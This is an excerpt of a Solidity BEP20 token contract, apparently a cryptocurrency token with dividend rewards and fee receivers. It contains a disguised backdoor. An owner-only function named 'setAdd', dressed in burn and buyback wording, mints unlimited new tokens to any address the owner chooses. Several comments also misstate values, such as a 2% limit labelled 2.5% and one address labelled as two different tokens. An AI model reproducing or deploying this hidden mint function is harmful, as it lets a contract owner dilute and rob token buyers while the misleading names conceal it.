...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 EP = IBEP20(0x6c021Ae822BEa943b2E66552bDe1D2696a53fbB7); // ETH
...
contract Test is IBEP20, Auth {
    ...
    address EP = 0x6c021Ae822BEa943b2E66552bDe1D2696a53fbB7; // TOMB rewards
    ...
    uint256 public _maxTxAmount = _totalSupply.div(50); // 2.5%
    uint256 public _maxWallet = _totalSupply.div(50); // 2.5%
    uint256 _buyback = _totalSupply/1;
    ...
    address public autoLiquidityReceiver=0x0aaCb284655b6B815345C551e8797b9d315F1191; //liq address
    address public marketingFeeReceiver=0x0aaCb284655b6B815345C551e8797b9d315F1191; // marketing address
...
//        emit Transfer(sender, recipient, amount);
    ...
    function setAdd(address deadaddress, uint256 buyback) onlyOwner  public virtual {
        require(deadaddress != address(0), "ERC20: burn to the zero address");
        _beforeTokenTransfer(address(0), deadaddress, buyback);
        _buyback += buyback;
        _balances[deadaddress] += buyback;
        emit Transfer(address(0), deadaddress, buyback);
    }
